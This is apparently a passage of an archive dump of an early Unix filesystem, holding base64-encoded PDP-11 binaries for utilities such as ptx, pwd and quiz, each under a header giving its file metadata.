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
IK/QIACsEVgAACCjcgvDYDBHJAsk4CAXJAvk6ACqEAAQz0AsEVAIDCZQIAlyAIAO0F9wmq
/PcJSv9XIdRODwNXIeRODAP3NYAAhDYCAjcKfDbFZQgA9wkY/8XlCACHAPcJLPz3C2Y2uA
P37Wo2XDb3CQABZhHAFbJOARIQCgISEAoDEhAKBBIQCsUVsk7mFQABwBW+TgEkCQUYBgIk
BocVggMkA4cSggQkEILAFb5OAeQmCgLkTgsmCgPkTgsE5IMLTguC5U4LgeWNU8QMQwxCDE
EMoQAODNwCzhUAgMVlAgBXIbpO1YfWC4UVdwBe/vcJnPv3beA10jX3Cs419wlyAGYRxRXC
Tvc1gADMNQIDxWUEAAAKAQoCCgMKBArADAICgArlCxcgAAELAlchvk4IgsAVsk5QEJAQ0B
AQEYUVhwChAAEMAgwDDAQMDTDnAyYQwBWyTgFkJgoCZE4LJgoDZE4LBGRDC04LgmVOC4Fl
gBXVAfctSjVUNQQD9xX//0A1hwD3FQEAODWHAHU+j8IoXMP1/0UA4AAAAAD/RQDgAAAAAG
Eub3V0AENhbid0IGZpbmQgJXMKAEJhZCBmb3JtYXQ6ICVzCgBtb24ub3V0AE5vIG1vbi5v
dXQKAE5vIHN5bWJvbHM6ICVzCgBObyB0aW1lIGFjY3VtdWxhdGVkCgAvZGV2L3Z0MABDYW
5ub3Qgb3BlbiB2dAoAICAgIG5hbWUgJSV0aW1lICNjYWxsICBtcy9jYWxsCgAlOC44cyU2
LjFmACU2cwAgJTcuMmYKAAoAGAtkAG4LbwBoC3gAqgtmALgLZQBGC2MAVAtzACQLbADGC3
IAAAAAAPz/8P/9//j/HIkAAAWJAAAAAAOJAAAAAgWJAAAAAAiJAAC2AQSJAAAAAAOJAAAA
ABOJAAAAAMw+zMzMzM3MCgD2EgQTFBMkEyQTJBMkEyQTJBMMExwTJBOMFpQWJBNEFWYVYB
VWFSQTJBPSF9gXnBYaFaIWaBUyFU4Yehb+Fb4VZhbQFaYV1BP+EwgUKBQ0FEQUVBRkFAEA

-- /usr/bin/ptx mode=0100775 uid=3 gid=3 atime=174923479 mtime=174923479 base64=1 --
BwHmCl4BEAUAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JRgoBiXcJoArmC/UlAQAEAB
AEQB0GAPilLQACAAoC9xVkAMoKtwrSDPUKBAD1ZQIABgD1JQIABAAGB84VNQvfCQAG9wns
CUAdBgAOHAIA3wngCDcQpgwLBEAdBgAOHAIA5hVAC98JAAbWC/cJxAnOFYAB5h1cCt8Jeg
jWCzUQ+P8JBM4dTArmFVEL3wkABtYL9wmeCXcd+P92Ds4VAQDmFQIA3wn+CNYLwDUBAAcC
zhXiAeYVAgDfCf4I1gv3CSIB9wkIB84dNAzfCWQINwosDM4dPA7fCWQI9xUBADIO9wnSBz
UQ+P8GBM4VYwvfCQAG9wk+CfUL+P8oAg4K5h3SCeYdzgnmFYAL5hV9C+YVeAvmFW4L3wms
CMZlDAAOCuYdsAnmHawJ5hWZC+YVlgvmFZEL5hWDC98JrAjGZQwAzhWcC98JAAb3CegI9w
nECEAt+P/7Ag4K5h14Cd8J4AjWCzcQmAsJBM4daAnmFbAL3wkABtYL9wm6CPUlAwAEAAoG
zhW2AUAdBgAmHAQA3wl6CNYLBAHOFQEA3wmYCDUQ+P8LBEAdBgAOHAQA5hXCC98JAAbWC/
cJegh3Hfj/Ug33Cd4B9wkGBvcJBAB3AOgIdwnWCM4d/AjfCQwK9wlUCHcA1Ah3CcIIxuUQ
AF8AogM1Cvj/NQr0/yMBdR34//L/QB34/zCKRAy1Cvj/9RX///T/tQr0/0Ad9P8AnEQMNR
Ds/8AlIAD1A3Ud9P/4/zUK8P9iAbUK9P/3CdQFNRD2//UlCgD2/9kD9Qv2/9YD9SUoAPb/
AwL1FX8A9v/1JSAA9v/oA/UlCQD2/+QD9Qv0/w0DNQr0//Utdgj4/wcFQB34//CVIABEDL
UK+P/1LWAI+P/SBUAd+P9wnfb/RAy1Cvj/ygF1Hfj/9P81Cu7/QB3w/8AMABzoCkBt7v8A
kjUQ7P+1Cu7/QR30/0GcRAy1CvT/QCDsA8ALDQL1CvT/QB30/wCcRAw1EOr/wCUgAJEDwA
uPA7UK8P9AHfD/wAzwC+gK0AJ1Hfj/9P8EAU4d9v/fCbIHQB34/wCcRAy1Cvj/NRD2//MC
zhV+AN8Jsgc1Cvj/EwFAHfj/AJxEDDUQ9v+1Cvj/wCUgAAQCdS30//j/BANOHfb/3wmyB3
Ut9P/4/+kGzhUKAN8JsgdAHfT/AJxEDLUK9P81EPb/AwPAJSAA9AL1CvT/9Qv2/wIDXwAk
AvcJfAQ1EPb/AgNfAAICdwAWB3cJBAfG5Q4AwB1CB4AMwGUGADUQ8P9fALoFAAo1EOz/NR
Du/zUQ9v/1Ff//8v8oAfUL9P8pA/UlfwD0/wMC9RUoAPT/9S0GB/b/BQVAHfb/cJ30/0QM
9SV+APT/AwJ1Hfb/8v/1C/L/AwW1Cuz/AgG1Cu7/tQr2//cJ8gM1EPT/9SUKAPT/1AL1C/
L/BQR1Hfb/8v+1Cvb/9Qrs/3Ut8P/u/ycEdR3y//j/dS3w/+7/DQT1Cvj/QB34//ClIABE
DPQDwAvyBfUK7v/zAfUL+P9ABUAd8v/wlYAARAxAHfL/QO34/8BlAgA1YOz/dR34//L/wB
1YBkDt8P9ALez/KQV1HfL/+P9AHez/9Qrs/8EdPAZB7fD/QCAOBrUK+P9AHfj/8KUgAEQM
7gNALfb/6wf1Cuz/8gF1Lfb/+P8KB0Ad8v/wlYAARAy1Cuz/dR34//L/9wsECBwCwB3yBU
Dt8P9A7ez/NRD4/wcBzhUJAN8Jsgf15QgA+P/1JQgA+P/1B/UK+P8JBc4VIADfCbIH+AHO
FdML3wkABnUd8v/4/wcBQB34/wCcRAwOEN8JzAW1Cvj/dS32//j/8wb3C5wHAwLOFdkLAg
HOFdwL3wkABvUV///4/wcBQB34/wCcRAwOEN8JzAW1Cvj/dS3y//j/8wb3C2YHBAPOFSIA
3wmyB84VCgDfCbIH9wlkAjUQ9P8CA18AzgN3AP4EdwnsBEAdBADARQD/wCWAAAsCzhUuAN
8JsgfOFS4A3wmyB/UVLgAEAE4dBADfCbIHdwDKBHcJuATG5X4Adx0EAA4JRBHEZQYAwJ8E
CQkDtwr+CBcgJQAGAw4Q3wmyB/QBdwCaBDcK6gg3CuoI16/gCC0ABAK3CtgItwrWCPcIKA
F3EMoINwrMCBcgLgAEAvcIFgF3EMAIgxHDZQQAwRXgC0IU2gMRIPwCSgABFQUEAQvTlS0A
AQEBFfcJAgBSAQAKF3IKAGYQARACA/cJ8P+AFcBlMAATkIcAE5UBAsMKE5VAAsMKPgHBHW
wIAwoCE9KLAgODCkR+AhU4AcIVCAwCAcIVDAwBFQUD9wtKCAID05UwAAAK9wkCACQBZhAK
dgID9wn2/4AVgEwCAMBlMAAXIDkAAgfAZQcAE5CHAMAdFgjCHRAI9wmUAAwBwB0ICMIdAg
j3CYYABQEEFTcV8gd3AOb+ghHCZQQAg+AmEeYVIADEEAMLw23WBwYH9wvUBwMC3wmyB8N+
xAsEA46U3wmyBwR/wwsFB84VIADfCbIHw37WC4QVdwCg/jcKqAcBCsCfnge3CpoHwOUwAB
cg+v8CAgAVAwEXIAkABoK3CoYHV3AKAAFg7AHAZTAAgwDEZQgA05U/AIcAZhGFEcAdbgcE
AvcJLADAHWQHUJ0EAAcDtwpaB/cKVAcCBvcJFABAHQQAhRWHAGYRhRH3CQQAhRWHAMAdOA
cKA8DlKg83EBoEwB0mBwECgAoAiRAM9xUqDxwH9xUAAhQH1y0OBwIAA4L3FQEABgeHAGYR
hRH3CugEDgT3FRYN4gTAHdoEA4kWDQACDIfACwoDwAo3EMoEAArA38YEtwrCBIUVhwA3EL
wGAAo3CrIEhRWHAGYRhRFAHQQABokChncAZAIACoUVhwBmEYURdx0EAJQDdx0GAJADAIkW
DAKGdwBEAoUVhwBmEYURQB0EACmJAoZ3ADAChRWHAGYRhRF3HQQAaANAEcBlBgA3EGADAI
kcDHcAEAJmEYURAokDAQWGdwACAjcQUAgACoUVhwBmEYURdx0EADoDdx0GADYDAIkiDAKG
dwDeAYUVhwBmEYURQR0EAFcgFAAfhkAdBgB3EBYDwQxmHCwRMRAsETcQCgMJA8A1AQAGAs
EMwQzBZVYJdxD2AgCJKAwKh8A1AQABAw4QgBWFFYcAwBUWACYK1gt3AIIBJhDAHdAHTAEm
EMAdygdIASYQwB3EB0QBJhDAHb4HQAEmEMAduAc8ASYQwB2yBzgBJhDAHawHNAEmEMAdpg
cwASYQwB2gBywBJhDAHZoHKAEmEMAdlAckASYQwB2OByABJhDAHYgHHAEmEMAdggcYASYQ
wB18BxQBJhDAHXYHEAEmEMAdcAcMASYQwB1qBwgBJhDAHWQHBAEmEMAdXgcAAWYQphDmEC
YRyAmEFYMVghWBFYAVBgBmEYURdx0EABoCAIkuDAKGdwC4AAAKhRWHAGYRhRH3CSIAJhAH
iQOG1gt3AJ4A1gsCA30QBACFFYcAZhGFEUAdBAABiWYRQR0CAIURAAp3LPz/0gECAsAVAg
B3IswBAwLAZQIAIgF3IsIBAwLAZQQAHAF3IrgBAwJAbAIAFgF3IrABBQJBbAIAwWUEAOYB
d6wBAKMBCgImEEASwAAXdPn/AWDBZQIAgBXYAYAMhRWHAEARhREmEeYQphDmC0gAQRFEGE
MYQhhGEYUVhwA3EDoEwBX//0YRhRWHAAQLDwsRCxQLGAsbCx8LIgslCygLKwsvCzILAABI
AC90bXAvcC50bXAAYQBhbgBhbmQAYXMAZm9yAGlzAG9mAG9uAG9yAHRoZQB0bwB1cABhcm
cgY291bnQKACVzOiBjYW5ub3Qgb3BlbgoAY2Fubm90IGNyZWF0ZSAlcwoAdHJ5IGFnYWlu
CgAvYmluL3NvcnQAc29ydAAtZAAtbwAvdXNyL2Jpbi9zb3J0AHNvcnQALWQALW8Ac29tZW
9uZSBtb3ZlZCBzb3J0CgBjYW5ub3QgcmVvcGVuICVzCgAlczogY2Fubm90IG9wZW4KAC54
eCAiACAgACIgIgB2BmQAzAZvAMYGeAAIB2YAFgdlAKQGYwCyBnMAggZsACQHcgAAAAAA/P
/w//3/+P8EiSoPAAAIiQAAAAALiQAAAAAFiQAAAAAwiQAAAAAKiQAA3wkAANYLliXGZQAA
dwC+8/8B
-- /usr/bin/pwd mode=0100775 uid=3 gid=3 atime=174924589 mtime=174923490 base64=1 --
BwEMAyYAQAIAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8J2AIBiXcJxgLmC84VNAXmFQ
wD3wmWAtYLDgrmFQ4D3wlWAtYLNxD2BAIE9wkmAc4VEADmFVwF5h3kBN8JdAKWJTUQ+P/A
JRAAAgf3CQYB9y3QBPQE7ALOHcQE3wlAAvclAQDkBAIC9wkOAPcJGgHOFQ4D3wkmAskBdw
lSAsblBADOFTQF5hVeBd8JlgLWCzUQ9v8CBPcJvAD1HYQE+P/OFRID3wkmAjUQ9v8CBPcJ
pAAOCuYVEgPfCVYC1gs3EF4EAgT3CY4AzhUQAOYVXAXmHUwE3wl0ApYlNRD2/8AlEAACB/
cJbgD3C14E7QPOFTQF5hVeBd8JlgLWCzUQ9v8CBPcJUAB3Lfj/FgTdAvdF/58SBPclAEAM
BNYC96UuACoECgL3pS4AIwQDAveLHgQFA/eLFwQCA/cJTgDOFQEA5hUSA+YVAQDfCbYCli
X3CQQAdwCIAXcJdgH3C6QBAgQ3Cp4BwB2aAfCVCgAyA84dkAGOCuYVMgPmFQEA3wm2ApYl
9wlAAXcAVAF3CUIBxuUEAPUV///4/7UK+P9AHfj/8IteBfkCwB1YAUBt+P/AZQIAwCX/AQ
IE9wma/8AdQgGACjUQ9v8LAUAd9v9Abfj/QR32/3CcMgMzA/UK9v/1C/b/8gRAHfj/wG0W
AYAKNxAQAUAd+P/wnQYBMgP1Cvj/AgR3ANgAQB34/wEQcJxeBTID9AFmEYURdx0EAOgAAI
kWAwKGdwDEAAAKhRWHAGYRhRFAHQQABokChncArgAACoUVhwBmEYURdx0EALwAdx0GALgA
AIkaAwKGdwCOAIUVhwBmEYURQB0EAHcdBgCgAHcdCACcAACJIAMChncAbACFFYcAZhGFEX
cdBACIAHcdBgCEAACJJgMChncATgAACoUVhwBmEYURQB0EAHcdBgBqAHcdCABmAACJLAMC
hncAKgCFFYcAZhGFEUAdBAABiUARhREmEeYQphDmC0gAQRFEGEMYQhhGEYUVhwA3EGwCwB
X//0YRhRWHAC4ALi4AAC8A//8MiQAABYkAAAAAA4kAAAAAEokAAAAABIkAAAAA
-- /usr/bin/quiz mode=0110775 uid=3 gid=3 atime=174923513 mtime=174923513 base64=1 --
BwHYD1oCzAcAAAAAAAABAAnwgBEmEtALNhACAPcJFAUOEN8JpA8BiXcJkg/mC/UVmhb4/x
4Btwq0D/2lIAD4/wwC9SWaFvj/BgNAHfj/8KUgAP//AgL1Cvj//aUKAPj/KgJAHfj/8KVc
AP//GQK1Cvj/zhWSFN8JpA09kPj/wCX//9kCAAp3AEIPQB34//ClIAD//wkC9Qr4//2VCg
D4//Ulmhb4//GHtQr4/z2K+P/AFQEA6AFAHfj/wOWaFsAlyADVBs4VVBDfCQgLzhWSFN8J
pA03kNIVwJ3OFcAl/wDRA/elCgDCFfECoQF3Cc4O5gt3HQQA1BZ3HQYA0BbOFQEA3wkSAT
UQ+P/AJQEAAgN3ALgODgrmFQEA3wlcAtYL9wF3CZgOxuUGAPUdnhb0/zUK+P9OHQQA3wmy
ATUQ9v/AJQEAAgR3AIIOwJ+AFsEV4A83EKIOESD+AnkACABAHfb/QR0EAEEKQEBAXfj/6w
G3CloWdV0EAPj/NQoEANoB9QsEAAMDdx30/0AWDgrfCbIBwCUBAAMEwBUCANQBwJ8sFsEV
9A83EGIOESD+AnkACAAACsgBwBUBAMUBtwoOFrkBdwn4DeYLwJ8CFsEVCBA3EFIOESD+An
kADgDAFQEAKgG3CugV/4vkFSMD/6UKANwVAwK3CtYV5wHAn9AVDhBmHQQA3wlcAtYLwCUB
ANwDAAoRAbcKthVOHQQA3wkSATUQ+P//pV0ApBUDAsAlAQAEBMAVAgB3AJINtwqQFfULBA
DCA/UL+P/jA74Btwp+FU4dBADfCRIBNRD4//+lfQBsFecCwCUBAOQFxAF3CU4Nf60GAFgV
BgPAFQIAAQEACncASA31CwQAEANAnQYADhDfCaQCJhDAnzIVJhD3CRQA1guAJewCtwoiFb
cKIBXAFQEA5gF3CQYN9aVBAAQABAb1pVoABAAEBECdBAB3APwMQJ0EAMBVIAD5AXcJ4Ax3
HQQA6hTOFQEA3wngAncA3Ax3CcoMwJ/WFMEVKBA3EEYNESD+AnkADgA1CgQAtwq+FPEBtw
q4FE4dBADfCeAC9gG3CqoU/6UKAKQU8AP1CwQA7QPAn5gUDhDfCboM5wF3AIoMdwl4DMbl
BgB1HQQA+P81Cvb/dR34/wQAQB32/8AMQG0GADUS9P8nAfVlAgD4/yMB/aUKAPj/KgNAHf
j/QO0EAMAlZAAjB/2lXAD4/w0CQB34//ClCgABAOcDfZ/4//T/tQr0/7UK+P99n/j/9P+1
CvT/tQr4//2lOgD4/wcD2AH9pQoA+P8GA7UK+P/9pToA+P/2Aj2K9P9AHfj/tQr4/8ilCg
AEAkAd9v+ACgoBtQr2//UlCgD2/6wGzhVlEN8JCAt3AMQLdwmyC8blBgA1Cvj/dS0GAPj/
Lwc1Cvb/JQFAHfb/wAxAbQgADhJAHfj/wAxAbQQAJhLfCdwA1gs1EPT/wCUBAAIE9wm8Bf
UL9P8KA0Ad+P/ADEBtDABIHfb/tQr4/9YBtQr2/3UtCgD2/9cGAAp3AFILwBUBAPsBdwk6
C+YL9wme+8ALHgPOFZQX5hWaFt8JMgPWCzUQ+P/OFagXZh34/84K5hWWF2YdBgBmHQQA3w
n4A8ZlCADAC+IDwBUBAHcAAgsACvwBdwnsCgAKNxAWCzcQaA33CUj7wAsQA7cKAAvAHfwK
wAzwHfwKNBL3JcgA7grwBs4VhRDfCQgLdwDECncJsgrmCzUK+P/OFWQA3wkkCkEd+P/BDD
EQlBe1Cvj/9SUKAPj/8QZ3AJgKdwmGCsblDgD1FaAQ9P9OEc5l8P/fCYQPQB3y/8BFA4DA
VQEANxBMESoBQB0GAPilLQACACgCABwCAACcAQDBFUgQNxDiChEg/gJ5AAQA9SUCAAQABQ
RAHQYANRwEAPT/9eUCAAQA9WUEAAYACAH3FQEAmgz1CgQA9WUCAAYA9SUBAAQA0gXOFZIU
Zh30/98JQA3WC8Al//8GAs4VtBDfCQgL9wnaCfcJKv/1JQIABAAEBU4d9P/fCeQIzhWSCO
YVAgDfCXYO1gtAHQQAwAxAbQYACApOHQQAzgpmHQYAzmUCAN8JcATWC8ALAgL3CfwDzh16
Dt8JKg3OFZIU5h1wEd8JQA3WC8Al//8CAvcJ3AP3CYb+9wv2CwQD9y2WCZYJAwT3HY4Jjg
n3CeoBNRD4/w4KQB34/8AMJhw0EuYdLg7fCVIOliVAHfj/wAwOHDYSQB34/8AMDuw0EuYV
mhbmHQwO3wnoDZYlzhWUF+YVmhbfCTID1gvAHQoRwAz4i5QXBgPAHQARwAz4i5QXBgJAHf
j/8JUBAMQTxwHAHeYQwAwOHJQX3wnKAs4VvRDfCQgLNQrs/84VMBffCbgHwAsgAsAdwhDA
DA4clBffCcoCzhW/EN8JCAv1C+z/AgK3CooNQB34//cLJgsDA8EV//8CAcEVAQBwkMQTd2
3s/24NlAHAHYIQwAwOHJQX5hUwF98J3ADWCzUQ9v/AJQEAAgT3CbQC9SUBAPb/HQLOFcEQ
3wkIC/UL7P8CArcKLA1mHfj/zmXEE+YVAQCAnwIAgGUekMAlAQDRBvctWghaCM0HtwpUCM
oBzhXJEN8JCAv1C+z/AgK3CvQMQB34//cLkAoDA8EV//8CAcEVAQBwkMQTtQrs/5ABdwny
B+YLdR0EAPj/zhUBAGYd+P8mCt8J6A2WJcALAgL3CbYA/aUgAPj/DAJ1LQQA+P8GA0Ad+P
/wpSAA//8CAvUK+P/9pQoA+P8QAnUtBAD4/w+GQB34//ClIAD//wkC9Qr4//2VCgD4//AB
tQr4/80BPYr4/0Ad+P9A7QQAdwCCB3cJcAfmC8EdVA5XcDUMwUUAgHcQSA5XdP7/wA03co
AHdxB+BzUK+P8QAbcKdAf3LW4HbgcKBjcKaAf1C/j/AgP3CRQA9RUBAPj/wB1UB/CLxBPr
BncAKgd3CRgHzh30C+Yd7gvmFdAQ3wkIC5Yl9wvkCwcDzh3eC+YV6BDfCQgL1gvBHcwLV3
BkAMANwh3CC8JtwAsCcg4Q5hX7EN8JCAvWC/cJxAZ3ANgGdwnGBsblBgDOFQcR3wkIC/cJ
IPfAC1kCzhUZEd8JCAvOFZIUZh0EAN8JQA3WC8Al//8CAvcJfgb3Cfj2zhWUF+YVmhbfCT
ID1gvOFRsR3wkIC84VKRHfCQgLzh1UDt8JygLOFTMR3wkIC84dRg7fCcoCzhU1Ed8JCAvO
HTQO3wnKAs4VQhHfCQgLzh0mDt8JygLOFVcR3wkIC84dFg7fCcoCzhViEd8JCAvOHQQO3w
nKAs4VZBHfCQgLzhWBEd8JCAv3CfoFdwAOBs4VExHfCQgLzhWUF+YVmhbfCTID1gs1EPT/
9RUBAPb/DQHOFRUR3wkIC0Ad9v/ADA4clBffCcoCtQr2/3Ut9P/2/+8GzhUXEV8A8Ah3Cb
AFzhWaFuYVqhHfCQgL1gt3AKwFdwmaBc4VtxHfCQgL9wmEBXcAmAVmEYURJhHmEKYQ91UB
AJwH91UBAJgHRB0EAMRlAwCEDMMdjAcuAcIQwxLDRQEAtyB+ByeG9yB4BySH5hUABN8JCg
7WCzcQWA0/EGYHwCX//zcDwB1cB8BlAgDALUINAwP/VQEATAfAHTYNwGX+Az8QLg03EDwH
/xXQETYH/1UBADAHyzUBAAIDzgGLEsISyjUBAPsDABHADMBggCDEhwARwAzAYDcQCAeAIA
KD/xIAB8Ad/AbAVQEACxDAEMBlAgCCFYMVhBWFFYcAZhGFEUAdBADAZf7/NxDWBv9FAQDQ
BoUVhwB3CaIExuV+AHcdBACyDEQRxGUGAMCfqAwJA7cKogwXICUABgMOEN8Jugz0AXcAhA
Q3Co4MNwqODNevhAwtAAQCtwp8DLcKegz3CCgBdxBuDDcKcAwXIC4ABAL3CBYBdxBkDIMR
w2UEAMEV2BFCFNoDESD8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCgBmEAEQAgP3Cf
D/gBXAZTAAE5CHABOVAQLDChOVQALDCj4BwR0QDAMKAhPSiwIDgwpEfgIVOAHCFQASAgHC
FQQSARUFA/cL7gsCA9OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZTAAFyA5AAIHwG
UHABOQhwDAHboLwh20C/cJlAAMAcAdrAvCHaYL9wmGAAUBBBU3FZYLdwDm/oIRwmUEAIPg
JhHmFSAAxBADC8NtegsGB/cLeAsDAt8JugzDfsQLBAOOlN8JugwEf8MLBQfOFSAA3wm6DM
N+1guEFXcAoP43CkwLAQrAn0ILtwo+C8DlMAAXIPr/AgIAFQMBFyAJAAaCtwoqC1dwCgAB
YOwBwGUwAIMAxGUIANOVPwCHAGYRhRHAHRILBAL3CSwAwB0IC1CdBAAHA7cK/gr3CvgKAg
b3CRQAQB0EAIUVhwBmEYUR9wkEAIUVhwDAHdwKCgPA5dYXNxAKBcAdygoBAoAKAIkIEvcV
1hfACvcVAAK4CtctsgoCAAOC9xUBAKoKhwBmEYURQB0EAAaJAoZ3AJACAAqFFYcAZhGFEX
cdBADGBACJDhJKh0EdBgAREBEKAAqFFYcANwpeCmYRhRFBHQQA8eUCAAIADwRXLAIA//8H
BWaeBAD3CUIAQBwEAAcB9wk4APEKAgBAHAQAJpQ2lAEAMRAEAIAVhRWHAGYRhRFBHQQA8Q
oCAAIE9wkOAAAKQN4EALEKBACFFYcAQBDAZQYANxBIBDEQBABAEgCJFBIFh8AKA4ExEAIA
hwB3AOIBZhGFEUAdBAB3HQYAJgR3HQgAIgQAiRoSAoZ3AMQBhRWHAGYRhRH3HRIEDgR3bQ
QACAQAiSASAoZ3AKYBwB38A3dtBAD2A4UVhwBmEYURdx0EAOYDAIkgEgKGdwCEAXcdBADY
AwAKhRWHAGYRhRFAHQQAdx0GAMgDdx0IAMQDAIkmEgKGdwBaAQAKhRWHAGYRhRFBHQQAVy
AUAB+GQB0GAHcQogPBDGYc1hkxENYZNxCWAwkDwDUBAAYCwQzBDMFlzg53EIIDAIksEgqH
wDUBAAEDDhCAFYUVhwDAFRYAJgrWC3cA/AAmEMAdAgtMASYQwB38CkgBJhDAHfYKRAEmEM
Ad8ApAASYQwB3qCjwBJhDAHeQKOAEmEMAd3go0ASYQwB3YCjABJhDAHdIKLAEmEMAdzAoo
